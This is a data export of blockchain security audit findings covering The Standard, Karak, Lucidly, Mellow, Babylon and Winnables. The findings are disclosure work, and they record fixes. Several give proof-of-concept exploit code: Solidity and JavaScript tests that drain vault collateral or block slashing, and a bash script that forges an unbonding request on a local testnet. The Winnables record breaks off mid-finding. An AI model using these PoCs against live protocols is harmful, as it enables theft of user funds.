However, due to insufficient input validation, these Hypervisor collateral tokens can be removed from the Smart Vault by calling [`SmartVaultV4::removeAsset`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L191-L196):

```solidity
function removeAsset(address _tokenAddr, uint256 _amount, address _to) external onlyOwner {
    ITokenManager.Token memory token = getTokenManager().getTokenIfExists(_tokenAddr);
    if (token.addr == _tokenAddr && !canRemoveCollateral(token, _amount)) revert Undercollateralised();
    IERC20(_tokenAddr).safeTransfer(_to, _amount);
    emit AssetRemoved(_tokenAddr, _amount, _to);
}
```

Hypervisor tokens are present only in the [`SmartVaultV4::hypervisors`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L26) array and are not handled by the `TokenManager` contract, so `token.addr` will equal `address(0)` and the collateralisation check will be bypassed. Thus, these tokens can be extracted from the contract, leaving the Smart Vault in an undercollateralised state and the protocol with bad debt.

**Impact:** An attacker can borrow the maximum mintable amount of `USDs` against their deposited yield collateral, then leave their Smart Vault undercollateralised by simply removing the collateral Hypervisor tokens. The attacker receives both the `USDs` and its backing collateral while the protocol is left with bad debt, likely compromising the stability of `USDs` if executed on a large scale or atomically with funds obtained from a flash loan.

**Proof of Concept:** The following test can be added to `SmartVault.js`:

```javascript
it('can steal collateral hypervisor tokens', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await user.sendTransaction({ to: Vault.address, value: ethCollateral });

  let { collateral, totalCollateralValue } = await Vault.status();
  let preYieldCollateral = totalCollateralValue;
  expect(getCollateralOf('ETH', collateral).amount).to.equal(ethCollateral);

  depositYield = Vault.connect(user).depositYield(ETH, HUNDRED_PC);
  await expect(depositYield).not.to.be.reverted;
  await expect(depositYield).to.emit(YieldManager, 'Deposit').withArgs(Vault.address, MockWeth.address, ethCollateral, HUNDRED_PC);

  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  const mintedValue = ethers.utils.parseEther('100');
  await Vault.connect(user).mint(user.address, mintedValue);

  // Vault is fully collateralised after minting USDs
  expect(await Vault.undercollateralised()).to.be.equal(false);

  const hypervisorBalanceVault = await MockUSDsHypervisor.balanceOf(Vault.address);
  await Vault.connect(user).removeAsset(MockUSDsHypervisor.address, hypervisorBalanceVault , user.address);

  // Vault has no collateral left and as such is undercollateralised
  expect(await MockUSDsHypervisor.balanceOf(Vault.address)).to.be.equal(0);
  expect(await Vault.undercollateralised()).to.be.equal(true);

  // User has both the minted USDs and Hypervisor collateral tokens
  expect(await MockUSDsHypervisor.balanceOf(user.address)).to.be.equal(hypervisorBalanceVault);
  expect(await USDs.balanceOf(user.address)).to.be.equal(mintedValue);
});
```

**Recommended Mitigation:** Validate that the asset removed is not a Hypervisor token present in the `hypervisors` array.

If considering adding the Hypervisor tokens as collateral in the `TokenManager`, ensure that they are excluded from [this loop](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L108-L111) within `SmartVaultV4::usdCollateral` and the [pricing calculation](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L131) in `SmartVaultV4::getAssets` is also updated accordingly.

**The Standard DAO:** Fixed by commit [`5862d8e`](https://github.com/the-standard/smart-vault/commit/5862d8e10ac8648b89a7e3a78498ff20dc31e42e).

**Cyfrin:** Verified, Hypervisor tokens can no longer be removed without causing `SmartVault::removeAsset` to revert due to being undercollateralised. However, the use of the `remainCollateralised()` modifier in `SmartVaultV4::removeCollateralNative` has introduced a re-entrancy vulnerability whereby the protocol burn fee can be bypassed by the Smart Vault owner: deposit native collateral ‚Üí mint USDs ‚Üí remove native collateral ‚Üí re-enter & self-liquidate. Here, the original validation should be used as this does not affect Hypervisor tokens.

**The Standard DAO:** Fixed by commit [`d761d48`](https://github.com/the-standard/smart-vault/commit/d761d48e957d45c5d61eb494d41b7362f7001155).

**Cyfrin:** Verified, `SmartVaultV4::removeCollateralNative` can no longer be used to re-enter in an undercollateralised state.",The Standard Smart Vault,Giovanni Di Siena|Immeas,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md,,,solodit_reports,,2024-09-24 02:16:37,2024-10-15 02:18:58,1,"function deposit(address _collateralToken, uint256 _usdPercentage) external returns (address _hypervisor0, address _hypervisor1) {
        if (_usdPercentage < MIN_USDS_PERCENTAGE) revert StablePoolPercentageError();
        uint256 _balance = IERC20(_collateralToken).balanceOf(address(msg.sender));
        IERC20(_collateralToken).safeTransferFrom(msg.sender, address(this), _balance);
        HypervisorData memory _hypervisorData = hypervisorData[_collateralToken];
        if (_hypervisorData.hypervisor == address(0)) revert HypervisorDataError();
        _usdDeposit(_collateralToken, _usdPercentage, _hypervisorData.pathToUSDC);
        _hypervisor0 = usdsHypervisor;
        if (_usdPercentage < HUNDRED_PC) {
            _otherDeposit(_collateralToken, _hypervisorData);
            _hypervisor1 = _hypervisorData.hypervisor;
        }
        emit Deposit(msg.sender, _collateralToken, _balance, _usdPercentage);
    }
```
    function depositYield(bytes32 _symbol, uint256 _stablePercentage) external onlyOwner {
        if (_symbol == NATIVE) IWETH(ISmartVaultManagerV3(manager).weth()).deposit{value: address(this).balance}();
        address _token = getTokenisedAddr(_symbol);
        uint256 _balance = getAssetBalance(_token);
        if (_balance == 0) revert InvalidToken();
        IERC20(_token).safeApprove(ISmartVaultManagerV3(manager).yieldManager(), _balance);
        uint256 _preDepositCollateral = usdCollateral();
        (address _hypervisor1, address _hypervisor2) = ISmartVaultYieldManager(ISmartVaultManagerV3(manager).yieldManager()).deposit(_token, _stablePercentage);
        addUniqueHypervisor(_hypervisor1);
        if (_hypervisor2 != address(0)) addUniqueHypervisor(_hypervisor2);
        if (undercollateralised() || significantCollateralDrop(_preDepositCollateral, usdCollateral())) revert Undercollateralised();
    }
```
    function deposit(uint256 deposit0, uint256 deposit1, address to, address pos, uint256[4] memory minIn) external returns (uint256 shares);
```
    function removeAsset(address _tokenAddr, uint256 _amount, address _to) external onlyOwner {
        ITokenManager.Token memory token = getTokenManager().getTokenIfExists(_tokenAddr);
        if (token.addr == _tokenAddr && !canRemoveCollateral(token, _amount)) revert Undercollateralised();
        IERC20(_tokenAddr).safeTransfer(_to, _amount);
        emit AssetRemoved(_tokenAddr, _amount, _to);
    }
```
    address[] private hypervisors;
```
        for (uint256 i = 0; i < acceptedTokens.length; i++) {
            ITokenManager.Token memory _token = acceptedTokens[i];
            _usds += calculator.tokenToUSD(_token, getAssetBalance(_token.addr));
        }
```
            assets[i] = Asset(token, assetBalance, calculator.tokenToUSD(token, assetBalance));",
1836686,7ba51e1fec9f8aefdc66a52ed9df227a,[H-02] The operator can create a `NativeVault` that can be silently unslashable,Code4rena,2024-07-16,"An operator can create a `NativeVault` which always reverts when `slashAssets()` is called and make the vault unslashable.

### Proof of Concept

When an operator want to create a `NativeVault`, he call the `deployVaults()` function on the `Core` contract with a custom config struct to give informations for the deployment. The `extraData` params is used to give the `manager`, `slahsStore` and `nodeImplementation` addresses on the `initialize()` function of the `NativeVault`.

When an asset is allowed on the protocol, a `slashingHandler` address is associated with the asset address on the `assetSlashingHandlers` mapping.

`NativeVault` is used to make native restaking with the ETH of Beacon Chain validators of users. When a slashing is executed, the address of `assetSlashingHandlers` mapping is inserted as a params in [the call](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/entities/SlasherLib.sol#L134-L138) `slashAssets()` :

```solidity
    for (uint256 i = 0; i < queuedSlashing.vaults.length; i++) {
        IKarakBaseVault(queuedSlashing.vaults[i]).slashAssets(
            queuedSlashing.earmarkedStakes[i],
            self.assetSlashingHandlers[IKarakBaseVault(queuedSlashing.vaults[i]).asset()]
        );
    }
```

Then the function make this [verification](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/NativeVault.sol#L308) with the input address of `slashingHandler`:

```solidity
    if (slashingHandler != self.slashStore) revert NotSlashStore();
```

If the operator, during the initialization, insert a `slashStore` address which is different from the `assetSlashingHandlers` address for ETH, the call on the `NativeVault` will always revert and make the vault slash impossible.

**Proof of Concept**

You can add this PoC to the `./test/nativeRestaking/nativeVault.t.sol`:

```solidity

    function test_createUnslashableVault() public {
        //Setup
        vm.warp(1718549030);
        NativeVault unslashableVault;
        address badSlashStore = address(666);
        DSSContract dss = new DSSContract();

        vm.startPrank(address(dss));
        core.registerDSS(100000000000000000000);
        vm.stopPrank();       
        // Setup NativeNode implementation
        address nativeNodeImpl = address(new NativeNode());

        // Deploy Vaults
        VaultLib.Config[] memory vaultConfigs = new VaultLib.Config[](1);
        vaultConfigs[0] = VaultLib.Config({
            asset: Constants.DEAD_BEEF,
            decimals: 18,
            operator: operator,
            name: ""NativeTestVault"",
            symbol: ""NTV"",
            extraData: abi.encode(address(manager), badSlashStore, address(nativeNodeImpl))
        });

        vm.startPrank(operator);
        IDSS dssInterface = IDSS(address(dss));
        core.registerOperatorToDSS(dssInterface, bytes(""""));
        IKarakBaseVault[] memory vaults = core.deployVaults(vaultConfigs, address(0));
        unslashableVault = NativeVault(address(vaults[0]));
        
        //Register vault staked for dss
        Operator.StakeUpdateRequest memory stakeRequest = Operator.StakeUpdateRequest({
            vault: address(unslashableVault),
            dss: dssInterface,
            toStake: true
        });
        Operator.QueuedStakeUpdate memory queuedStake = core.requestUpdateVaultStakeInDSS(stakeRequest);
        vm.warp(1718549030 + 10 days);
        core.finalizeUpdateVaultStakeInDSS(queuedStake);
        vm.stopPrank();
        
        vm.startPrank(address(dss));
        //Slash request 
        uint96[] memory slashPercentagesWad = new uint96[](1);
        slashPercentagesWad[0] = 10000000000000000000;
        address[] memory operatorVaults = new address[](1);
        operatorVaults[0] = address(unslashableVault);
        
        SlasherLib.SlashRequest memory slashingReq = SlasherLib.SlashRequest({
            operator: operator,
            slashPercentagesWad: slashPercentagesWad,
            vaults: operatorVaults
        });

        //Request and execute the slashing but revert
        SlasherLib.QueuedSlashing memory queuedSlashing = core.requestSlashing(slashingReq);
        vm.warp(1718549030 + 14 days);
        core.finalizeSlashing(queuedSlashing);
        
        vm.stopPrank();
    }
```

Add also this contract for the dss on the same file :

```solidity
    contract DSSContract {
        uint256 variable;
        constructor() {
            variable = 1;
        }
        function returnVariable() external view returns(uint256 _variable) {
            _variable = variable;
        }
    }
```

And execute the command: `forge test --mt test_createUnslashableVault -vvvvv`.

### Recommended Mitigation Steps

You can add a verified `slashingHandler` for ETH on the `Core` contract and verify the operator use the correct `slashStore` params on the `initialize()` function in the `NativeVault`, or on the `deployVaults()` for `NativeVault`.

**[dewpe (Karak) disputed and commented](https://github.com/code-423n4/2024-07-karak-findings/issues/55#issuecomment-2267609461):**
 > We think it should be re-classified to `med` because it's ultimately the DSS' responsibility to figure out which operators and vaults to take in via the `registrationHook.selector`.

**[MiloTruck (judge) commented](https://github.com/code-423n4/2024-07-karak-findings/issues/55#issuecomment-2282714847):**
 > The crux of this issue and its duplicates is that for native vaults, `vaultConfig.extraData` has no input validation in when calling `deployVaults()`. This means the operator can set `manager`, `slashStore` and `nodeImplementation` to anything.
> 
> This issue has demonstrated how an operator can create an unslashable vault by creating it with `slashStore` as a different address than the whitelisted slashing handler for ETH. Slashing is core functionality of the protocol and being unable to do so would threaten the integrity of operators (eg. operator can act malicious, causing loss of funds, at no risk). 
> 
> https://github.com/code-423n4/2024-07-karak-findings/issues/85 describes how the setting the manager will allow the operator to call restricted functions.
> 
> As such, I believe high severity is appropriate.
> 
> > We think it should be re-classified to med because it's ultimately the DSS' responsibility to figure out which operators and vaults to take in via the `registrationHook.selector`.
> 
> Given that the DSS implementation isn't in-scope and wardens did not know what `registrationHook` could/couldn't do during the audit, I don't think it is fair to downgrade the issue based on this.

**[Karak mitigated](https://github.com/code-423n4/2024-09-karak-mitigation?tab=readme-ov-file#scope):**
> This mitigation removes the SlashStore altogether and the NativeVault itself burns the slashed ETH.

**Status:** Unmitigated. Full details in reports from [sl1](https://github.com/code-423n4/2024-09-karak-mitigation-findings/issues/12) and [0xCiphky](https://github.com/code-423n4/2024-09-karak-mitigation-findings/issues/8), and also included in the [Mitigation Review](#mitigation-review) section below.

***",Karak,sl1|lanrebayode77|1|2|Fulum|0xCiphky|givn|20centclub,HIGH,,55500,0,0,0,https://github.com/code-423n4/2024-07-karak-findings/issues/55,https://code4rena.com/reports/2024-07-karak,,https://code4rena.com/reports/2024-07-karak,solodit_reports,404007d75cc01b86a51c9dda5d091bcb,2024-10-11 02:08:00,2024-10-15 02:08:20,1,"for (uint256 i = 0; i < queuedSlashing.vaults.length; i++) {
            IKarakBaseVault(queuedSlashing.vaults[i]).slashAssets(
                queuedSlashing.earmarkedStakes[i],
                self.assetSlashingHandlers[IKarakBaseVault(queuedSlashing.vaults[i]).asset()]
            );
```
        if (slashingHandler != self.slashStore) revert NotSlashStore();",
1865835,beb873ce8bd5c7acd790d42f6358d1e7,[H-04] `amplification_` vs `amplification` in the pool constructor,Pashov Audit Group,2024-07-15,"**Severity**

**Impact:** Medium

**Likelihood:** High

**Description**

The mistake made during the input validation:

```
        if (amplification == 0) {
            revert Pool__MustBeInitiatedWithAGreaterThanZero();
        }

        amplification = amplification_;
```

[link](https://github.com/lucidlyfi/lucidly-core-v1/blob/f00c45bbadc836b9eaa94717a0b3aa017e792588/src/Pool.sol#L151)

Here the storage value checks when it was never written (equal to 0).
As a result, every pool deployment will fail.

**Recommendations**

```diff
-        if (amplification == 0) {
+        if (amplification_ == 0) {
```",Lucidly,Pashov Audit Group,HIGH,,,0,0,0,,https://github.com/pashov/audits/blob/master/team/md/Lucidly-security-review.md,,,solodit_reports,,2024-08-13 02:03:48,2024-10-15 02:07:58,1,,
1867223,8b0b346a8ae211865e93b71f1f030584,Lack of input validation on callbackParams.gauge allows for theft of positions,Cantina,2024-04-19,"Context: VeloAmmModule.sol#L39
Description: The gauge parameter is nowhere veriÔ¨Åed to be an actual Velodrome gauge. This would allow
for an attacker to steal all positions which are up for rebalancing.
1. Attacker deposits position in Core.sol and sets callbackParams.gauge to his own 'fake' gauge .
2. Since the gauge is owned by the attacker, the attacker can immediately get back the NFT.
3. Attacker calls rebalance on a victim 's position. The position with which it will be rebalanced is the
attacker 's position from above.
4. The attacker then calls setPositionParams and sets callbackParams.gauge to the victim 's gauge.
5. The attacker can then call withdraw and get the position from the gauge.
Recommendation: Verify that callbackParams.gauge is a Velodrome gauge.
Mellow: Fixed in commit 736eef90.
Cantina: Fixed in commit 736eef90. VeloAmmModule now veriÔ¨Åes that callbackParams.gauge is a valid
Velodrome gauge.
Note: it does not however verify that it is the position 's corresponding gauge. Could be used by users to not allow
for their position to be rebalanced (by calling setPositionParams on their position and changing the gauge).
Could be used by LpWrapper admins to disable deposits/withdrawals indeÔ¨Ånitely.",Mellow,Saw-mon and Natalie|deadrosesxyz|Kaden|Akshay Srivastav,HIGH,,,6,0,0,,https://cdn.cantina.xyz/reports/cantina_mellow_apr2024.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/cantina/cantina_mellow_apr2024.pdf,https://cantina.xyz/portfolio/72dfcce6-8b1b-4f5d-b5a7-657a40507b10,solodit_reports,288465c72e52ea1786ff418d1321bf03,2024-10-04 01:46:00,2024-10-15 01:46:50,1,,
1867331,e1ff59b7d1af7e3ebeb2d9ff1e8918a2,Malicious user can prevent other users from unbonding due to missing input validation,Cantina,2024-06-24,"Context: (No context Ô¨Åles were provided by the reviewer)
Description: One of the staking-api-service 's responsiblities lies in receiving and handling unbonding
requests via the api. Any user may send such a request if they want to unbond a previously submitted
staking transaction. In order to do so, they must send a request to the endpoint /v1/unbonding . Such
requests are checked to be valid unbonding requests and are then added to the Unbonding Requests DB .
The keyfor a transaction is the transaction 's hash which is required to be unique in the database. The
requests from that database are later taken by the unbonding-pipeline to be signed by the covenant-
signers and submitted to bitcoin. By using this API endpoint, users can request unbonding of their staking
transactions.
The problem is that currently this unbondingTxHash is user provided and not checked in any way. The only
sanity check done on it, is if it conforms to being in the format of a bitcoin transaction hash.
Due to this, any user can provide any unbondingTxHash they want and no other user can add another
element with that same keyas all keys mus be unique due to this check:
func (s *Services) UnbondDelegation(ctx context.Context, stakingTxHashHex, unbondingTxHashHex, txHex,
signatureHex string) *types.Error { ,‚Üí
// [...]
// 3. save unbonding tx into DB
err = s.DbClient.SaveUnbondingTx(ctx, stakingTxHashHex, unbondingTxHashHex, txHex, signatureHex)
if err != nil {
if ok := db.IsDuplicateKeyError(err); ok { // <-----
log.Ctx(ctx).Warn().Err(err).Msg(""unbonding request already been submitted into the system"")
return types.NewError(http.StatusForbidden, types.Forbidden, err)
} else if ok := db.IsNotFoundError(err); ok {
log.Ctx(ctx).Warn().Err(err).Msg(""no active delegation found for unbonding request"")
return types.NewError(http.StatusForbidden, types.Forbidden, err)
}
log.Ctx(ctx).Error().Err(err).Msg(""failed to save unbonding tx"")
return types.NewError(http.StatusInternalServerError, types.InternalServiceError, err)
}
return nil
}
9
func (db *Database) SaveUnbondingTx(
ctx context.Context, stakingTxHashHex, txHashHex, txHex, signatureHex string,
) error {
delegationClient := db.Client.Database(db.DbName).Collection(model.DelegationCollection)
unbondingClient := db.Client.Database(db.DbName).Collection(model.UnbondingCollection)
// Start a session
session, err := db.Client.StartSession()
if err != nil {
return err
}
defer session.EndSession(ctx)
// Define the work to be done in the transaction
transactionWork := func(sessCtx mongo.SessionContext) (interface{}, error) {
// [...]
_, err = unbondingClient.InsertOne(sessCtx, unbondingDocument)
if err != nil {
var writeErr mongo.WriteException
if errors.As(err, &writeErr) {
for _, e := range writeErr.WriteErrors {
if mongo.IsDuplicateKeyError(e) {
return nil, &DuplicateKeyError{ // <-----
Key: txHashHex,
Message: ""unbonding transaction already exists"",
}
}
}
}
return nil, err
}
return nil, nil
}
Since the hash of a transaction can be calculated without needing any signatures and unbonding transac-
tions can be created with only public information, a malicious user (Eve) can now do the following to an
honest user (Alice):
1) Alice wants to stake some bitcoin and therefore submits a staking transaction to Babylon.
2) Eve takes the transaction hash of Alice 's staking transaction and creates an unsigned unbonding
transaction which (if signed by Alice) would be elligible for unbonding.
3) Since unbonding transactions should always follow the same schema (one input, one output), this
unbonding transaction will look identical to if Alice had created it.
4) Eve now submits a valid staking transaction to Babylon herself.
5) Now since Eve has a valid delegation, she can also unbond it at any time.
6) Eve now creates a valid unbonding transaction for her delegation and signs it.
7) Now when submitting it to the staking-api-service , she does not provide her own unbondingTx-
Hash , but the hash of Alice 's staking transaction.
8) This will succeed due to the missing checks for whether that hash actually matches the provided
transaction.
9) Since now Alice 's transaction 's hash is present in the database, trying to unbond her staking trans-
action will fail since she is an honest user and will provide the correct hash for her transaction.
Impact: the impact of this can be quite severe which is why I would rate it as medium.
Likelihood: As any user can this as long as they know the public key of their victim, I would rate this as a
high likelihood issue.
Proof of concept: The following proof of concept is a modiÔ¨Åed version of the provided demo script for
the demo. It shows the issue with one wallet, where the Ô¨Årst transaction cannot be unbonded if another
one gets unbonded with the Ô¨Årst transaction hash.
10
In order to execute it, please add it to a Ô¨Åle poc_denial.sh in the same location as btcstaking-demo.sh .
Then start the testnet with the command provided in the readm: make start-deployment-btcstaking-
phase1-bitcoind . Once the system has started, please run the PoC by executing chmod +x poc_denial.sh
and then ./poc_denial.sh .
In this proof of concept, Eve will be able to unbond her bitcoin but Alice 's honest call to unbond will fail.
- !/bin/sh
RED= ' \033[0;31m '
GREEN= ' \033[0;32m '
YELLOW= ' \033[0;33m '
BLUE= ' \033[0;34m '
MAGENTA= ' \033[0;35m '
NC= ' \033[0m ' # No Color
BTCUSER=""rpcuser""
BTCPASSWORD=""rpcpass""
BTCWALLET=""btcstaker""
BTCWALLETPASS=""walletpass""
BTCCMD=""bitcoin-cli -regtest -rpcuser=$BTCUSER -rpcpassword=$BTCPASSWORD -rpcwallet=$BTCWALLET""
BTCCLI=""docker exec bitcoindsim /bin/sh -c ""
LOCATE=$(dirname ""$(realpath ""$0"")"")
DIR=""$LOCATE/.testnets/demo""
- The first transaction will be used to test the withdraw path
init() {
echo ""Wait a bit for bitcoind regtest network to initialize..""
# sleep 25
mkdir -p $DIR
echo ""$YELLOW Start End to End Test $NC""
}
get_all_transactions() {
echo ""getting all data from mongoDB""
result=$(docker exec mongodb /bin/sh -c ""mongosh staking-api-service --eval
' JSON.stringify(db.delegations.find().toArray(), null, 2) ' "") ,‚Üí
echo $result
}
create_staking_tx() {
staking_amount=$1
staking_time=$2
folder=$DIR/$staking_amount
staker_pk=$($BTCCLI ""$BTCCMD listunspent"" | jq -r ' .[0].desc | split(""]"") | .[1] | split("")"") | .[0] |
.[2:] ' ) ,‚Üí
unsigned_staking_tx_hex=$(docker exec unbonding-pipeline /bin/sh -c ""cli-tools create-phase1-staking-tx \
--magic-bytes 62627434 \
--staker-pk $staker_pk \
--staking-amount $staking_amount \
--staking-time $staking_time \
--covenant-committee-pks 0342301c4fdb5b1ab27a80a04d95c782f720874265889412a80d270feeb456f1f7 \
--covenant-committee-pks 03a4d2276a2a09f0e14d6a74901fec0aab3d1edf0dd22a690260acca48f5d5b3c0 \
--covenant-committee-pks 02707f3d6bf2334ecb7c336fc7babd400afa9132a34f84406b28865d06e0ba81e8 \
--covenant-quorum 2 \
--network regtest \
--finality-provider-pk 03d5a0bb72d71993e435d6c5a70e2aa4db500a62cfaae33c56050deefee64ec0"" | jq
.staking_tx_hex) ,‚Üí
# echo ""Sign the staking transactions through bitcoind wallet""
unsigned_staking_tx_hex=$($BTCCLI ""$BTCCMD \
fundrawtransaction $unsigned_staking_tx_hex \
' {\""feeRate\"": 0.00001, \""lockUnspents\"": true} ' "" | jq .hex)
# Unlock the wallet
$BTCCLI ""$BTCCMD walletpassphrase $BTCWALLETPASS 600""
# echo ""Sign the staking transactions through the Bitcoin wallet connection""
staking_tx_hex=$($BTCCLI ""$BTCCMD signrawtransactionwithwallet $unsigned_staking_tx_hex"" | jq ' .hex ' )
# echo ""Send the staking transactions to bitcoind regtest""
staking_txid=$($BTCCLI ""$BTCCMD sendrawtransaction $staking_tx_hex"")
mkdir -p $folder
echo ""$staking_tx_hex"" > $folder/tx_hex
BTC=$(($staking_amount / 100000000))
echo ""Sign and send a staking transaction with stake: $BTC BTC and staking term: $staking_time blocks""
11
echo ""Staking transaction submitted to bitcoind regtest with tx ID: $BLUE $staking_txid $NC""
echo ""$staking_txid"" > $folder/tx_id
}
just_create_unbonding_tx() {
tx_hex=$1
unbonding_time=$2
# Create the payload through a helper CLI on the unbonding-pipeline
unbonding_api_payload=$(docker exec unbonding-pipeline /bin/sh -c ""cli-tools
create-phase1-unbonding-request \ ,‚Üí
--magic-bytes 62627434 \
--covenant-committee-pks 0342301c4fdb5b1ab27a80a04d95c782f720874265889412a80d270feeb456f1f7 \
--covenant-committee-pks 03a4d2276a2a09f0e14d6a74901fec0aab3d1edf0dd22a690260acca48f5d5b3c0 \
--covenant-committee-pks 02707f3d6bf2334ecb7c336fc7babd400afa9132a34f84406b28865d06e0ba81e8 \
--covenant-quorum 2 \
--network regtest \
--unbonding-fee 500 \
--unbonding-time $unbonding_time \
--staker-wallet-address-host bitcoindsim:18443/wallet/btcstaker \
--staker-wallet-passphrase $BTCWALLETPASS \
--staker-wallet-rpc-user $BTCUSER \
--staker-wallet-rpc-pass $BTCPASSWORD \
--staking-tx-hex $tx_hex"")
echo ""$unbonding_api_payload""
}
create_unbonding_tx() {
tx_hex=$1
unbonding_time=$2
# Create the payload through a helper CLI on the unbonding-pipeline
unbonding_api_payload=$(docker exec unbonding-pipeline /bin/sh -c ""cli-tools
create-phase1-unbonding-request \ ,‚Üí
--magic-bytes 62627434 \
--covenant-committee-pks 0342301c4fdb5b1ab27a80a04d95c782f720874265889412a80d270feeb456f1f7 \
--covenant-committee-pks 03a4d2276a2a09f0e14d6a74901fec0aab3d1edf0dd22a690260acca48f5d5b3c0 \
--covenant-committee-pks 02707f3d6bf2334ecb7c336fc7babd400afa9132a34f84406b28865d06e0ba81e8 \
--covenant-quorum 2 \
--network regtest \
--unbonding-fee 500 \
--unbonding-time $unbonding_time \
--staker-wallet-address-host bitcoindsim:18443/wallet/btcstaker \
--staker-wallet-passphrase $BTCWALLETPASS \
--staker-wallet-rpc-user $BTCUSER \
--staker-wallet-rpc-pass $BTCPASSWORD \
--staking-tx-hex $tx_hex"")
# Submit the payload to the Staking API Service
echo ""$unbonding_api_payload""
# modified_payload=$(echo ""$unbonding_api_payload"" | jq --arg unbonding_tx_hash_hex ""$tx_hash_invalid""
' .unbonding_tx_hash_hex = $unbonding_tx_hash_hex ' ) ,‚Üí
curl -sSL localhost:80/v1/unbonding -d ""$unbonding_api_payload""
echo """"
}
current_info() {
height=$($BTCCLI ""$BTCCMD getblockcount"")
echo ""$BLUE Current Height $height $NC""
}
move_next_block() {
wait=10
echo ""Next bitcoin block will be produced in $wait seconds...""
sleep 10
current_info
}
print_global_parameters() {
ver=$1
echo ""Current Active Global Parameters""
curl -s --location ' 0.0.0.0:80/v1/global-params ' | jq --arg version ""$ver"" ' .data.versions[] |
select(.version == ($version | tonumber)) ' ,‚Üí
}
12
init
print_global_parameters 0
current_info
- need to be here to get at least to activation height (move_to_block is unreliable)
move_next_block
move_next_block
move_next_block
move_next_block
move_next_block
move_next_block
move_next_block
- Alice ' s TX
create_staking_tx 500000000 1000 # 5 BTC
move_next_block
move_next_block
- Eve creates unbonding tx for Alice
unbonding_tx_alice=$(just_create_unbonding_tx $(cat $DIR/500000000/tx_hex) 3)
unbonding_tx_hash_alice=$(echo ""$unbonding_tx_alice"" | jq -r ' .unbonding_tx_hash_hex ' )
echo ""$unbonding_tx_hash_alice""
- Eve ' s TX
create_staking_tx 200000000 1000 # 2 BTC
move_next_block
move_next_block
unbonding_tx_eve=$(just_create_unbonding_tx $(cat $DIR/200000000/tx_hex) 3)
modified_request=$(echo ""$unbonding_tx_eve"" | jq --arg unbonding_tx_hash_hex ""$unbonding_tx_hash_alice""
' .unbonding_tx_hash_hex = $unbonding_tx_hash_hex ' ) ,‚Üí
echo ""$modified_request""
- Eve submits own request with Alice ' s tx_hash
curl -sSL localhost:80/v1/unbonding -d ""$modified_request""
echo """"
echo ""Eve unbonded""
move_next_block
echo ""Alice unbonds""
- Alice tries to unbond
curl -sSL localhost:80/v1/unbonding -d ""$unbonding_tx_alice""
move_next_block
Recommendation: Since the provided hash should always match the provided transaction, I see no need
to let the user provide it. It would be better to just calculate the transaction 's hash in the staking-api-
service and using that as the keyfor the database as then no user could manipulate it.
Babylon: Fixed in staking-api-service PR 161.
13
3.2 Medium Risk",Babylonchain,zigtur|n4nika,HIGH,,,10,0,0,,https://cdn.cantina.xyz/reports/cantina_competition_babylon_may2024.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/cantina/cantina_competition_babylon_may2024.pdf,https://cantina.xyz/portfolio/3cdcca63-f15d-4cbe-96b2-fa52aa777737,solodit_reports,,2024-10-04 02:01:34,2024-10-15 02:02:22,1,,
1867433,584f0d7275ff5d5f7a167b3523b6bf00,H-1: Users will lock raffle prizes on the `WinnablesPrizeManager` contract by calling `WinnablesTicketManager::propagateRaffleWinner` with wrong CCIP inputs,Sherlock,2024-08-20,"# Issue H-1: Users will lock raffle prizes on the `WinnablesPrizeManager` contract by calling `WinnablesTicketManager::propagateRaffleWinner` with wrong CCIP inputs 

Source: https://github.com/sherlock-audit/2024-08-winnables-raffles-judging/issues/50 

## Found by 
0rpse, 0x0bserver, 0x73696d616f, 0xAadi, 0xbrivan, 0xrex, CatchEmAll, DrasticWatermelon, Feder, Galturok, IMAFVCKINSTARRRRRR, KungFuPanda, Oblivionis, Offensive021, Oxsadeeq, PNS, PTolev, Paradox, Penaldo, PeterSR, S3v3ru5, SadBase, SovaSlava, Trooper, Waydou, akiro, araj, dany.armstrong90, dimulski, dinkras\_, durov, dy, gajiknownnothing, iamnmt, irresponsible, jennifer37, joshuajee, matejdb, neko\_nyaa, ogKapten, philmnds, rsam\_eth, sakshamguruji, shaflow01, shikhar, tofunmi, turvec, utsav
### Summary

The [`WinnablesTicketManager::propagateRaffleWinner`](https://github.com/sherlock-audit/2024-08-winnables-raffles/blob/main/public-contracts/contracts/WinnablesTicketManager.sol#L334) function is vulnerable to misuse, where incorrect CCIP inputs can lead to assets being permanently locked in the `WinnablesPrizeManager` contract. The function does not have input validation for the `address prizeManager` and `uint64 chainSelector` parameters. If called with incorrect values, it will fail to send the message to `WinnablesPrizeManager`, resulting in the assets not being unlocked.


### Root Cause

The root cause of the issue lies in the design of the `propagateRaffleWinner` function:
1. The function is responsible for sending a message to WinnablesPrizeManager to unlock the raffle assets.
2. The function is marked as external, so anyone can call it.
3. The function receives `address prizeManager` and `uint64 chainSelector` as inputs, which are responsible for sending the message to the `WinnablesPrizeManager` contract for it to unlock the assets previously locked for the raffle.
4. The inputs forementioned are not validated, meaning users can call the function with wrong values.
5. This cannot be undone, as the function [changes the state of the raffle](https://github.com/sherlock-audit/2024-08-winnables-raffles/blob/main/public-contracts/contracts/WinnablesTicketManager.sol#L337) in a way that [prevents the function from being called again](https://github.com/sherlock-audit/2024-08-winnables-raffles/blob/main/public-contracts/contracts/WinnablesTicketManager.sol#L336).


### Internal pre-conditions

A raffle must have been won by a player.


### External pre-conditions

A user must call `WinnablesTicketManager::propagateRaffleWinner` with incorrect input values.


### Attack Path

1. A user wins the raffle.
